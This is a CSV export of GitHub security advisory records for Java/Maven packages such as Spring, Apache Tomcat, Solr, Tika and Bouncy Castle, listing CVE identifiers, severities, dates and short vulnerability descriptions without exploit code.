1284,35825,org.keycloak:keycloak-core,GHSA-w6gv-3r3v-gwgj,CVE-2017-2585,https://github.com/advisories/GHSA-w6gv-3r3v-gwgj,moderate,2018-10-18 16:47:41 UTC,Moderate severity vulnerability that affects org.keycloak:keycloak-core,"Red Hat Keycloak before version 2.5.1 has an implementation of HMAC verification for JWS tokens that uses a method that runs in non-constant time, potentially leaving the application vulnerable to timing attacks.",maven
1285,34577,org.apache.solr:solr-core,GHSA-387v-84cv-9qmc,CVE-2017-3163,https://github.com/advisories/GHSA-387v-84cv-9qmc,high,2018-10-18 16:40:43 UTC,Improper Limitation of a Pathname ('Path Traversal') in org.apache.solr:solr-core,"When using the Index Replication feature, Apache Solr nodes can pull index files from a master/leader node using an HTTP API which accepts a file name. However, Solr before 5.5.4 and 6.x before 6.4.1 did not validate the file name, hence it was possible to craft a special request involving path traversal, leaving any file readable to the Solr server process exposed. Solr servers protected and restricted by firewall rules and/or authentication would not be at risk since only trusted clients and users would gain direct HTTP access.",maven
1286,33906,org.springframework:spring-core,GHSA-8crv-49fr-2h6j,CVE-2016-5007,https://github.com/advisories/GHSA-8crv-49fr-2h6j,high,2018-10-17 20:30:12 UTC,Improper Authorization in org.springframework.security:spring-security-core and org.springframework:spring-core,"Both Spring Security 3.2.x, 4.0.x, 4.1.0 and the Spring Framework 3.2.x, 4.0.x, 4.1.x, 4.2.x rely on URL pattern mappings for authorization and for mapping requests to controllers respectively. Differences in the strictness of the pattern matching mechanisms, for example with regards to space trimming in path segments, can lead Spring Security to not recognize certain paths as not protected that are in fact mapped to Spring MVC controllers that should be protected. The problem is compounded by the fact that the Spring Framework provides richer features with regards to pattern matching as well as by the fact that pattern matching in each Spring Security and the Spring Framework can easily be customized creating additional differences.",maven
1287,33906,org.springframework:spring-core,GHSA-pgf9-h69p-pcgf,CVE-2015-5211,https://github.com/advisories/GHSA-pgf9-h69p-pcgf,high,2018-10-17 20:29:33 UTC,Files or Directories Accessible to External Parties in org.springframework:spring-core,"Under some situations, the Spring Framework 4.2.0 to 4.2.1, 4.0.0 to 4.1.7, 3.2.0 to 3.2.14 and older unsupported versions is vulnerable to a Reflected File Download (RFD) attack. The attack involves a malicious user crafting a URL with a batch script extension that results in the response being downloaded rather than rendered and also includes some input reflected in the response.",maven
1288,33906,org.springframework:spring-core,GHSA-6v7w-535j-rq5m,CVE-2015-3192,https://github.com/advisories/GHSA-6v7w-535j-rq5m,moderate,2018-10-17 20:29:12 UTC,Moderate severity vulnerability that affects org.springframework:spring-core,"Pivotal Spring Framework before 3.2.14 and 4.x before 4.1.7 do not properly process inline DTD declarations when DTD is not entirely disabled, which allows remote attackers to cause a denial of service (memory consumption and out-of-memory errors) via a crafted XML file.",maven
1289,33906,org.springframework:spring-core,GHSA-45vg-2v73-vm62,CVE-2015-0201,https://github.com/advisories/GHSA-45vg-2v73-vm62,moderate,2018-10-17 20:28:20 UTC,Moderate severity vulnerability that affects org.springframework:spring-core,"The Java SockJS client in Pivotal Spring Framework 4.1.x before 4.1.5 generates predictable session ids, which allows remote attackers to send messages to other sessions via unspecified vectors.",maven
1290,33906,org.springframework:spring-core,GHSA-3rmv-2pg5-xvqj,CVE-2018-1275,https://github.com/advisories/GHSA-3rmv-2pg5-xvqj,critical,2018-10-17 20:28:00 UTC,Improperly Implemented Security Check for Standard in org.springframework:spring-core,"Spring Framework, versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.16 and older unsupported versions, allow applications to expose STOMP over WebSocket endpoints with a simple, in-memory STOMP broker through the spring-messaging module. A malicious user (or attacker) can craft a message to the broker that can lead to a remote code execution attack. This CVE addresses the partial fix for CVE-2018-1270 in the 4.3.x branch of the Spring Framework.",maven
1291,33906,org.springframework:spring-core,GHSA-4487-x383-qpph,CVE-2018-1272,https://github.com/advisories/GHSA-4487-x383-qpph,high,2018-10-17 20:27:47 UTC,Possible privilege escalation in org.springframework:spring-core,"Spring Framework, versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported versions, provide client-side support for multipart requests. When Spring MVC or Spring WebFlux server application (server A) receives input from a remote client, and then uses that input to make a multipart request to another server (server B), it can be exposed to an attack, where an extra multipart is inserted in the content of the request from server A, causing server B to use the wrong value for a part it expects. This could to lead privilege escalation, for example, if the part content represents a username or user roles.",maven
1292,33906,org.springframework:spring-core,GHSA-g8hw-794c-4j9g,CVE-2018-1271,https://github.com/advisories/GHSA-g8hw-794c-4j9g,moderate,2018-10-17 20:07:03 UTC,Path Traversal in org.springframework:spring-core,"Spring Framework, versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported versions, allow applications to configure Spring MVC to serve static resources (e.g. CSS, JS, images). When static resources are served from a file system on Windows (as opposed to the classpath, or the ServletContext), a malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.",maven
1293,33906,org.springframework:spring-core,GHSA-p5hg-3xm3-gcjg,CVE-2018-1270,https://github.com/advisories/GHSA-p5hg-3xm3-gcjg,critical,2018-10-17 20:05:59 UTC,Spring Framework allows applications to expose STOMP over WebSocket endpoints,"Spring Framework, versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported versions, allow applications to expose STOMP over WebSocket endpoints with a simple, in-memory STOMP broker through the spring-messaging module. A malicious user (or attacker) can craft a message to the broker that can lead to a remote code execution attack.",maven
1294,33906,org.springframework:spring-core,GHSA-cxrj-66c5-9fmh,CVE-2018-1258,https://github.com/advisories/GHSA-cxrj-66c5-9fmh,high,2018-10-17 20:05:49 UTC,Spring Framework when used in combination with any versions of Spring Security contains an authorization bypass,Spring Framework version 5.0.5 when used in combination with any versions of Spring Security contains an authorization bypass when using method security. An unauthorized malicious user can gain unauthorized access to methods that should be restricted.,maven
1295,34577,org.apache.solr:solr-core,GHSA-7px3-6f6g-hxcj,CVE-2018-8026,https://github.com/advisories/GHSA-7px3-6f6g-hxcj,moderate,2018-10-17 19:55:34 UTC,Moderate severity vulnerability that affects org.apache.solr:solr-core,"This vulnerability in Apache Solr 6.0.0 to 6.6.4 and 7.0.0 to 7.3.1 relates to an XML external entity expansion (XXE) in Solr config files (currency.xml, enumsConfig.xml referred from schema.xml, TIKA parsecontext config file). In addition, Xinclude functionality provided in these config files is also affected in a similar way. The vulnerability can be used as XXE using file/ftp/http protocols in order to read arbitrary local files from the Solr server or the internal network. The manipulated files can be uploaded as configsets using Solr's API, allowing to exploit that vulnerability.",maven
1296,33906,org.springframework:spring-core,GHSA-rcpf-vj53-7h2m,CVE-2018-1257,https://github.com/advisories/GHSA-rcpf-vj53-7h2m,moderate,2018-10-17 20:02:20 UTC,Denial of Service in org.springframework:spring-core,"Spring Framework, versions 5.0.x prior to 5.0.6, versions 4.3.x prior to 4.3.17, and older unsupported versions allows applications to expose STOMP over WebSocket endpoints with a simple, in-memory STOMP broker through the spring-messaging module. A malicious user (or attacker) can craft a message to the broker that can lead to a regular expression, denial of service attack.",maven
1297,33906,org.springframework:spring-core,GHSA-v596-fwhq-8x48,CVE-2018-1199,https://github.com/advisories/GHSA-v596-fwhq-8x48,moderate,2018-10-17 20:01:54 UTC,"Improper Input Validation in org.springframework.security:spring-security-core, org.springframework.security:spring-security-core , and org.springframework:spring-core","Spring Security (Spring Security 4.1.x before 4.1.5, 4.2.x before 4.2.4, and 5.0.x before 5.0.1; and Spring Framework 4.3.x before 4.3.14 and 5.0.x before 5.0.3) does not consider URL path parameters when processing security constraints. By adding a URL path parameter with special encodings, an attacker may be able to bypass a security constraint. The root cause of this issue is a lack of clarity regarding the handling of path parameters in the Servlet Specification. Some Servlet containers include path parameters in the value returned for getPathInfo() and some do not. Spring Security uses the value returned by getPathInfo() as part of the process of mapping requests to security constraints. In this particular attack, different character encodings used in path parameters allows secured Spring MVC static resource URLs to be bypassed.",maven
1298,34577,org.apache.solr:solr-core,GHSA-rc9v-h28f-jcmf,CVE-2018-8010,https://github.com/advisories/GHSA-rc9v-h28f-jcmf,moderate,2018-10-17 19:56:04 UTC,There is a XML external entity expansion (XXE) vulnerability in Apache Solr  config files,"This vulnerability in Apache Solr 6.0.0 to 6.6.3, 7.0.0 to 7.3.0 relates to an XML external entity expansion (XXE) in Solr config files (solrconfig.xml, schema.xml, managed-schema). In addition, Xinclude functionality provided in these config files is also affected in a similar way. The vulnerability can be used as XXE using file/ftp/http protocols in order to read arbitrary local files from the Solr server or the internal network. Users are advised to upgrade to either Solr 6.6.4 or Solr 7.3.1 releases both of which address the vulnerability. Once upgrade is complete, no other steps are required. Those releases only allow external entities and Xincludes that refer to local files / zookeeper resources below the Solr instance directory (using Solr's ResourceLoader); usage of absolute URLs is denied. Keep in mind, that external entities and XInclude are explicitly supported to better structure config files in large installations. Before Solr 6 this was no problem, as config files were not accessible through the APIs.",maven
1299,34577,org.apache.solr:solr-core,GHSA-3pph-2595-cgfh,CVE-2018-1308,https://github.com/advisories/GHSA-3pph-2595-cgfh,high,2018-10-17 19:55:46 UTC,There is a XML external entity expansion (XXE) vulnerability in Apache Solr,This vulnerability in Apache Solr 1.2 to 6.6.2 and 7.0.0 to 7.2.1 relates to an XML external entity expansion (XXE) in the `&dataConfig=<inlinexml>` parameter of Solr's DataImportHandler. It can be used as XXE using file/ftp/http protocols in order to read arbitrary local files from the Solr server or the internal network.,maven
1300,38855,cn.hutool:hutool-all,GHSA-rhq2-2574-78mc,CVE-2018-17297,https://github.com/advisories/GHSA-rhq2-2574-78mc,high,2018-10-17 19:54:53 UTC,Unzip function in ZipUtil.java in Hutool allows remote attackers to overwrite arbitrary files via directory traversal,The unzip function in ZipUtil.java in Hutool before 4.1.12 allows remote attackers to overwrite arbitrary files via directory traversal sequences in a filename within a ZIP archive.,maven
1301,36764,org.apache.mesos:mesos,GHSA-c8cc-p3j7-4c7f,CVE-2018-8023,https://github.com/advisories/GHSA-c8cc-p3j7-4c7f,moderate,2018-10-17 19:54:14 UTC,Moderate severity vulnerability that affects org.apache.mesos:mesos,"Apache Mesos can be configured to require authentication to call the Executor HTTP API using JSON Web Token (JWT). In Apache Mesos versions pre-1.4.2, 1.5.0, 1.5.1, 1.6.0 the comparison of the generated HMAC value against the provided signature in the JWT implementation used is vulnerable to a timing attack because instead of a constant-time string comparison routine a standard `==` operator has been used. A malicious actor can therefore abuse the timing difference of when the JWT validation function returns to reveal the correct HMAC value.",maven
1302,34729,org.apache.storm:storm-core,GHSA-q35p-chc6-7x57,CVE-2018-1332,https://github.com/advisories/GHSA-q35p-chc6-7x57,moderate,2018-10-17 19:48:18 UTC,Moderate severity vulnerability that affects org.apache.storm:storm-core,"Apache Storm version 1.0.6 and earlier, 1.2.1 and earlier, and version 1.1.2 and earlier expose a vulnerability that could allow a user to impersonate another user when communicating with some Storm Daemons.",maven
1303,34729,org.apache.storm:storm-core,GHSA-p8jx-x2vw-wm33,CVE-2018-1331,https://github.com/advisories/GHSA-p8jx-x2vw-wm33,high,2018-10-17 19:48:06 UTC,High severity vulnerability that affects org.apache.storm:storm-core,"In Apache Storm 0.10.0 through 0.10.2, 1.0.0 through 1.0.6, 1.1.0 through 1.1.2, and 1.2.0 through 1.2.1, an attacker with access to a secure storm cluster in some cases could execute arbitrary code as a different user.",maven
1304,34729,org.apache.storm:storm-core,GHSA-x825-rjww-2245,CVE-2017-9799,https://github.com/advisories/GHSA-x825-rjww-2245,high,2018-10-17 18:30:01 UTC,"Apache Storm it is possible for the owner of a topology to trick the supervisor to launch a worker as a different, non-root, user","It was found that under some situations and configurations of Apache Storm 1.x before 1.0.4 and 1.1.x before 1.1.1, it is theoretically possible for the owner of a topology to trick the supervisor to launch a worker as a different, non-root, user. In the worst case this could lead to secure credentials of the other user being compromised.",maven
1305,34638,org.apache.pdfbox:pdfbox,GHSA-gx96-vgf7-hwfg,CVE-2018-11797,https://github.com/advisories/GHSA-gx96-vgf7-hwfg,moderate,2018-10-17 18:22:29 UTC,In Apache PDFBox a carefully crafted PDF file can trigger an extremely long running computation,"In Apache PDFBox 1.8.0 to 1.8.15 and 2.0.0RC1 to 2.0.11, a carefully crafted PDF file can trigger an extremely long running computation when parsing the page tree.",maven
1306,34638,org.apache.pdfbox:pdfbox,GHSA-4c32-xmgj-2g98,CVE-2016-2175,https://github.com/advisories/GHSA-4c32-xmgj-2g98,high,2018-10-17 18:22:15 UTC,High severity vulnerability that affects org.apache.pdfbox:pdfbox,"Apache PDFBox before 1.8.12 and 2.x before 2.0.1 does not properly initialize the XML parsers, which allows context-dependent attackers to conduct XML External Entity (XXE) attacks via a crafted PDF.",maven
1307,34048,org.springframework.data:spring-data-commons,GHSA-5q8m-mqmx-pxp9,CVE-2018-1274,https://github.com/advisories/GHSA-5q8m-mqmx-pxp9,high,2018-10-17 17:23:44 UTC,Spring Data Commons contain a property path parser vulnerability caused by unlimited resource allocation,"Spring Data Commons, versions 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property path parser vulnerability caused by unlimited resource allocation. An unauthenticated remote malicious user (or attacker) can issue requests against Spring Data REST endpoints or endpoints using property path parsing which can cause a denial of service (CPU and memory consumption).",maven
1308,34048,org.springframework.data:spring-data-commons,GHSA-m929-7fr6-cvjg,CVE-2018-1259,https://github.com/advisories/GHSA-m929-7fr6-cvjg,high,2018-10-17 17:23:36 UTC,"Spring Data Commons, used in combination with XMLBeam, contains a property binder vulnerability caused by improper restriction of XML external entity references","Spring Data Commons, versions 1.13 prior to 1.13.12 and 2.0 prior to 2.0.7, used in combination with XMLBeam 1.4.14 or earlier versions, contains a property binder vulnerability caused by improper restriction of XML external entity references as underlying library XMLBeam does not restrict external reference expansion. An unauthenticated remote malicious user can supply specially crafted request parameters against Spring Data's projection-based request payload binding to access arbitrary files on the system.",maven
1309,34048,org.springframework.data:spring-data-commons,GHSA-4fq3-mr56-cg6r,CVE-2018-1273,https://github.com/advisories/GHSA-4fq3-mr56-cg6r,critical,2018-10-17 17:23:24 UTC,Spring Data Commons remote code injection vulnerability,"Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property binder vulnerability caused by improper neutralization of special elements. An unauthenticated remote malicious user (or attacker) can supply specially crafted request parameters against Spring Data REST backed HTTP resources or using Spring Data's projection-based request payload binding that can lead to a remote code execution attack.",maven
1310,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-6v52-mj5r-7j2m,CVE-2018-8037,https://github.com/advisories/GHSA-6v52-mj5r-7j2m,moderate,2018-10-17 16:33:02 UTC,Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core,"If an async request was completed by the application at the same time as the container triggered the async timeout, a race condition existed that could result in a user seeing a response intended for a different user. An additional issue was present in the NIO and NIO2 connectors that did not correctly track the closure of the connection when an async request was completed by the application and timed out by the container at the same time. This could also result in a user seeing a response intended for another user. Versions Affected: Apache Tomcat 9.0.0.M9 to 9.0.9 and 8.5.5 to 8.5.31.",maven
1311,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-46j3-r4pj-4835,CVE-2018-8034,https://github.com/advisories/GHSA-46j3-r4pj-4835,high,2018-10-17 16:32:43 UTC,The host name verification missing in Apache Tomcat,"The host name verification when using TLS with the WebSocket client was missing. It is now enabled by default. Versions Affected: Apache Tomcat 9.0.0.M1 to 9.0.9, 8.5.0 to 8.5.31, 8.0.0.RC1 to 8.0.52, and 7.0.35 to 7.0.88.",maven
1312,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-r4x2-3cq5-hqvp,CVE-2018-8014,https://github.com/advisories/GHSA-r4x2-3cq5-hqvp,critical,2018-10-17 16:32:32 UTC,The defaults settings for the CORS filter provided in Apache Tomcat are insecure and enable 'supportsCredentials' for all origins,"The defaults settings for the CORS filter provided in Apache Tomcat 9.0.0.M1 to 9.0.8, 8.5.0 to 8.5.31, 8.0.0.RC1 to 8.0.52, 7.0.41 to 7.0.88 are insecure and enable 'supportsCredentials' for all origins. It is expected that users of the CORS filter will have configured it appropriately for their environment rather than using it in the default configuration. Therefore, it is expected that most users will not be impacted by this issue.",maven
1313,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-m59c-jpc8-m2x4,CVE-2018-1336,https://github.com/advisories/GHSA-m59c-jpc8-m2x4,high,2018-10-17 16:32:18 UTC,In Apache Tomcat there is an improper handing of overflow in the UTF-8 decoder,"An improper handing of overflow in the UTF-8 decoder with supplementary characters can lead to an infinite loop in the decoder causing a Denial of Service. Versions Affected: Apache Tomcat 9.0.0.M9 to 9.0.7, 8.5.0 to 8.5.30, 8.0.0.RC1 to 8.0.51, and 7.0.28 to 7.0.86.",maven
1314,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-jx6h-3fjx-cgv5,CVE-2018-1305,https://github.com/advisories/GHSA-jx6h-3fjx-cgv5,moderate,2018-10-17 16:31:48 UTC,Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core,"Security constraints defined by annotations of Servlets in Apache Tomcat 9.0.0.M1 to 9.0.4, 8.5.0 to 8.5.27, 8.0.0.RC1 to 8.0.49 and 7.0.0 to 7.0.84 were only applied once a Servlet had been loaded. Because security constraints defined in this way apply to the URL pattern and any URLs below that point, it was possible - depending on the order Servlets were loaded - for some security constraints not to be applied. This could have exposed resources to users who were not authorised to access them.",maven
1315,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-6rxj-58jh-436r,CVE-2018-1304,https://github.com/advisories/GHSA-6rxj-58jh-436r,moderate,2018-10-17 16:31:17 UTC,Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core,"The URL pattern of """" (the empty string) which exactly maps to the context root was not correctly handled in Apache Tomcat 9.0.0.M1 to 9.0.4, 8.5.0 to 8.5.27, 8.0.0.RC1 to 8.0.49 and 7.0.0 to 7.0.84 when used as part of a security constraint definition. This caused the constraint to be ignored. It was, therefore, possible for unauthorised users to gain access to web application resources that should have been protected. Only security constraints with a URL pattern of the empty string were affected.",maven
1316,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-5q99-f34m-67gc,CVE-2018-11784,https://github.com/advisories/GHSA-5q99-f34m-67gc,moderate,2018-10-17 16:31:02 UTC,Moderate severity vulnerability that affects org.apache.tomcat.embed:tomcat-embed-core,"When the default servlet in Apache Tomcat versions 9.0.0.M1 to 9.0.11, 8.5.0 to 8.5.33 and 7.0.23 to 7.0.90 returned a redirect to a directory (e.g. redirecting to '/foo/' when the user requested '/foo') a specially crafted URL could be used to cause the redirect to be generated to any URI of the attackers choice.",maven
1317,34320,org.apache.tomcat.embed:tomcat-embed-core,GHSA-pjfr-qf3p-3q25,CVE-2017-12615,https://github.com/advisories/GHSA-pjfr-qf3p-3q25,high,2018-10-17 16:30:31 UTC,When running Apache Tomcat on Windows with HTTP PUTs enabled it was possible to upload a JSP file to the server,When running Apache Tomcat 7.0.0 to 7.0.79 on Windows with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.,maven
1318,35085,org.bouncycastle:bcprov-jdk15,GHSA-4mv7-cq75-3qjm,CVE-2015-7940,https://github.com/advisories/GHSA-4mv7-cq75-3qjm,moderate,2018-10-17 16:27:50 UTC,Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15,"The Bouncy Castle Java library before 1.51 does not validate a point is withing the elliptic curve, which makes it easier for remote attackers to obtain private keys via a series of crafted elliptic curve Diffie Hellman (ECDH) key exchanges, aka an ""invalid curve attack.""",maven
1319,37675,org.bouncycastle:bcprov-jdk14,GHSA-w285-wf9q-5w69,CVE-2016-1000352,https://github.com/advisories/GHSA-w285-wf9q-5w69,high,2018-10-17 16:27:38 UTC,In Bouncy Castle JCE Provider the ECIES implementation allowed the use of ECB mode,In the Bouncy Castle JCE Provider version 1.55 and earlier the ECIES implementation allowed the use of ECB mode. This mode is regarded as unsafe and support for it has been removed from the provider.,maven
1320,37675,org.bouncycastle:bcprov-jdk14,GHSA-fjqm-246c-mwqg,CVE-2016-1000346,https://github.com/advisories/GHSA-fjqm-246c-mwqg,low,2018-10-17 16:27:28 UTC,In Bouncy Castle JCE Provider the other party DH public key is not fully validated,In the Bouncy Castle JCE Provider version 1.55 and earlier the other party DH public key is not fully validated. This can cause issues as invalid keys can be used to reveal details about the other party's private key where static Diffie-Hellman is in use. As of release 1.56 the key parameters are checked on agreement calculation.,maven
1321,37675,org.bouncycastle:bcprov-jdk14,GHSA-2j2x-hx4g-2gf4,CVE-2016-1000344,https://github.com/advisories/GHSA-2j2x-hx4g-2gf4,high,2018-10-18 17:43:55 UTC,In Bouncy Castle JCE Provider the DHIES implementation allowed the use of ECB mode,In the Bouncy Castle JCE Provider version 1.55 and earlier the DHIES implementation allowed the use of ECB mode. This mode is regarded as unsafe and support for it has been removed from the provider.,maven
1322,37675,org.bouncycastle:bcprov-jdk14,GHSA-rrvx-pwf8-p59p,CVE-2016-1000343,https://github.com/advisories/GHSA-rrvx-pwf8-p59p,high,2018-10-17 16:24:22 UTC,In Bouncy Castle JCE Provider the DSA key pair generator generates a weak private key if used with default values,"In the Bouncy Castle JCE Provider version 1.55 and earlier the DSA key pair generator generates a weak private key if used with default values. If the JCA key pair generator is not explicitly initialised with DSA parameters, 1.55 and earlier generates a private value assuming a 1024 bit key size. In earlier releases this can be dealt with by explicitly passing parameters to the key pair generator.",maven
1323,37675,org.bouncycastle:bcprov-jdk14,GHSA-qcj7-g2j5-g7r3,CVE-2016-1000342,https://github.com/advisories/GHSA-qcj7-g2j5-g7r3,high,2018-10-17 16:24:12 UTC,In Bouncy Castle JCE Provider ECDSA does not fully validate ASN.1 encoding of signature on verification,"In the Bouncy Castle JCE Provider version 1.55 and earlier ECDSA does not fully validate ASN.1 encoding of signature on verification. It is possible to inject extra elements in the sequence making up the signature and still have it validate, which in some cases may allow the introduction of 'invisible' data into a signed structure.",maven
1324,37675,org.bouncycastle:bcprov-jdk14,GHSA-r9ch-m4fh-fc7q,CVE-2016-1000341,https://github.com/advisories/GHSA-r9ch-m4fh-fc7q,moderate,2018-10-17 16:24:00 UTC,Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15,"In the Bouncy Castle JCE Provider version 1.55 and earlier DSA signature generation is vulnerable to timing attack. Where timings can be closely observed for the generation of signatures, the lack of blinding in 1.55, or earlier, may allow an attacker to gain information about the signature's k value and ultimately the private value as well.",maven
1325,37675,org.bouncycastle:bcprov-jdk14,GHSA-r97x-3g8f-gx3m,CVE-2016-1000340,https://github.com/advisories/GHSA-r97x-3g8f-gx3m,high,2018-10-17 16:23:50 UTC,The Bouncy Castle JCE Provider carry a propagation bug,"In the Bouncy Castle JCE Provider versions 1.51 to 1.55, a carry propagation bug was introduced in the implementation of squaring for several raw math classes have been fixed (org.bouncycastle.math.raw.Nat???). These classes are used by our custom elliptic curve implementations (org.bouncycastle.math.ec.custom.**), so there was the possibility of rare (in general usage) spurious calculations for elliptic curve scalar multiplications. Such errors would have been detected with high probability by the output validation for our scalar multipliers.",maven
1326,37675,org.bouncycastle:bcprov-jdk14,GHSA-c8xf-m4ff-jcxj,CVE-2016-1000339,https://github.com/advisories/GHSA-c8xf-m4ff-jcxj,moderate,2018-10-17 16:23:38 UTC,Moderate severity vulnerability that affects org.bouncycastle:bcprov-jdk14 and org.bouncycastle:bcprov-jdk15,In the Bouncy Castle JCE Provider version 1.55 and earlier the primary engine class used for AES was AESFastEngine. Due to the highly table driven approach used in the algorithm it turns out that if the data channel on the CPU can be monitored the lookup table accesses are sufficient to leak information on the AES key being used. There was also a leak in AESEngine although it was substantially less. AESEngine has been modified to remove any signs of leakage (testing carried out on Intel X86-64) and is now the primary AES class for the BC JCE provider from 1.56. Use of AESFastEngine is now only recommended where otherwise deemed appropriate.,maven
1327,37675,org.bouncycastle:bcprov-jdk14,GHSA-4vhj-98r6-424h,CVE-2016-1000338,https://github.com/advisories/GHSA-4vhj-98r6-424h,high,2018-10-17 16:23:26 UTC,In Bouncy Castle JCE Provider it is possible to inject extra elements in the sequence making up the signature and still have it validate,"In Bouncy Castle JCE Provider version 1.55 and earlier the DSA does not fully validate ASN.1 encoding of signature on verification. It is possible to inject extra elements in the sequence making up the signature and still have it validate, which in some cases may allow the introduction of 'invisible' data into a signed structure.",maven
1328,37675,org.bouncycastle:bcprov-jdk14,GHSA-4446-656p-f54g,CVE-2018-1000613,https://github.com/advisories/GHSA-4446-656p-f54g,critical,2018-10-17 16:23:12 UTC,Deserialization of Untrusted Data in Bouncy castle,Legion of the Bouncy Castle Legion of the Bouncy Castle Java Cryptography APIs version prior to version 1.60 contains a CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') vulnerability in XMSS/XMSS^MT private key deserialization that can result in Deserializing an XMSS/XMSS^MT private key can result in the execution of unexpected code. This attack appear to be exploitable via A handcrafted private key can include references to unexpected classes which will be picked up from the class path for the executing application. This vulnerability appears to have been fixed in 1.60 and later.,maven
1329,34809,io.vertx:vertx-web,GHSA-h39x-m55c-v55h,CVE-2018-12542,https://github.com/advisories/GHSA-h39x-m55c-v55h,critical,2018-10-17 16:20:45 UTC,Eclipse Vert.x does not properly neutralize '' (forward slashes) sequences that can resolve to an external location,"In version from 3.0.0 to 3.5.3 of Eclipse Vert.x, the StaticHandler uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\' (forward slashes) sequences that can resolve to a location that is outside of that directory when running on Windows Operating Systems.",maven
1330,34172,io.vertx:vertx-core,GHSA-qh3m-qw6v-qvhg,CVE-2018-12544,https://github.com/advisories/GHSA-qh3m-qw6v-qvhg,moderate,2018-10-17 16:20:32 UTC,Moderate severity vulnerability that affects io.vertx:vertx-core,"In version from 3.5.Beta1 to 3.5.3 of Eclipse Vert.x, the OpenAPI XML type validator creates XML parsers without taking appropriate defense against XML attacks. This mechanism is exclusively when the developer uses the Eclipse Vert.x OpenAPI XML type validator to validate a provided schema.",maven
1331,34172,io.vertx:vertx-core,GHSA-45xm-v8gq-7jqx,CVE-2018-12541,https://github.com/advisories/GHSA-45xm-v8gq-7jqx,moderate,2018-10-17 16:19:59 UTC,Excessive memory allocation,"In version from 3.0.0 to 3.5.3 of Eclipse Vert.x, the WebSocket HTTP upgrade implementation buffers the full http request before doing the handshake, holding the entire request body in memory. There should be a reasonnable limit (8192 bytes) above which the WebSocket gets an HTTP response with the 413 status code and the connection gets closed.",maven
1332,34809,io.vertx:vertx-web,GHSA-rvgg-f8qm-6h7j,CVE-2018-12540,https://github.com/advisories/GHSA-rvgg-f8qm-6h7j,high,2018-10-17 16:19:43 UTC,High severity vulnerability that affects io.vertx:vertx-web,"In version from 3.0.0 to 3.5.2 of Eclipse Vert.x, the CSRFHandler do not assert that the XSRF Cookie matches the returned XSRF header/form parameter. This allows replay attacks with previously issued tokens which are not expired yet.",maven
1333,34455,org.apache.tika:tika-core,GHSA-5mf7-26mw-3rqr,CVE-2018-1338,https://github.com/advisories/GHSA-5mf7-26mw-3rqr,moderate,2018-10-17 15:50:45 UTC,Moderate severity vulnerability that affects org.apache.tika:tika-core,A carefully crafted (or fuzzed) file can trigger an infinite loop in Apache Tika's BPGParser in versions of Apache Tika before 1.18.,maven
1334,34455,org.apache.tika:tika-core,GHSA-j53j-gmr9-h8g3,CVE-2018-8017,https://github.com/advisories/GHSA-j53j-gmr9-h8g3,moderate,2018-10-17 15:50:31 UTC,Moderate severity vulnerability that affects org.apache.tika:tika-core,"In Apache Tika 1.2 to 1.18, a carefully crafted file can trigger an infinite loop in the IptcAnpaParser.",maven
1335,34455,org.apache.tika:tika-core,GHSA-w6g3-v46q-5p28,CVE-2018-11762,https://github.com/advisories/GHSA-w6g3-v46q-5p28,moderate,2018-10-17 15:49:58 UTC,Moderate severity vulnerability that affects org.apache.tika:tika-core,"In Apache Tika 0.9 to 1.18, in a rare edge case where a user does not specify an extract directory on the commandline (--extract-dir=) and the input file has an embedded file with an absolute path, such as ""C:/evil.bat"", tika-app would overwrite that file.",maven
1336,34455,org.apache.tika:tika-core,GHSA-6jq2-789q-fff2,CVE-2018-11761,https://github.com/advisories/GHSA-6jq2-789q-fff2,high,2018-10-17 15:49:36 UTC,High severity vulnerability that affects org.apache.tika:tika-core,"In Apache Tika 0.1 to 1.18, the XML parsers were not configured to limit entity expansion. They were therefore vulnerable to an entity expansion vulnerability which can lead to a denial of service attack.",maven
1337,34455,org.apache.tika:tika-core,GHSA-j8g6-2wh7-6439,CVE-2016-6809,https://github.com/advisories/GHSA-j8g6-2wh7-6439,critical,2018-10-17 15:44:36 UTC,Apache Tika allows Java code execution for serialized objects embedded in MATLAB files,Apache Tika before 1.14 allows Java code execution for serialized objects embedded in MATLAB files. The issue exists because Tika invokes JMatIO to do native deserialization.,maven
1338,34455,org.apache.tika:tika-core,GHSA-4xr4-4c65-hj7f,CVE-2016-4434,https://github.com/advisories/GHSA-4xr4-4c65-hj7f,high,2018-10-17 15:44:22 UTC,Apache Tika does not properly initialize the XML parser or choose handlers,"Apache Tika before 1.13 does not properly initialize the XML parser or choose handlers, which might allow remote attackers to conduct XML External Entity (XXE) attacks via vectors involving (1) spreadsheets in OOXML files and (2) XMP metadata in PDF and other file formats, a related issue to CVE-2016-2175.",maven
1339,34455,org.apache.tika:tika-core,GHSA-ccjp-w723-2jf2,CVE-2015-3271,https://github.com/advisories/GHSA-ccjp-w723-2jf2,moderate,2018-10-17 15:44:10 UTC,Moderate severity vulnerability that affects org.apache.tika:tika-core,Apache Tika server (aka tika-server) in Apache Tika 1.9 might allow remote attackers to read arbitrary files via the HTTP fileUrl header.,maven
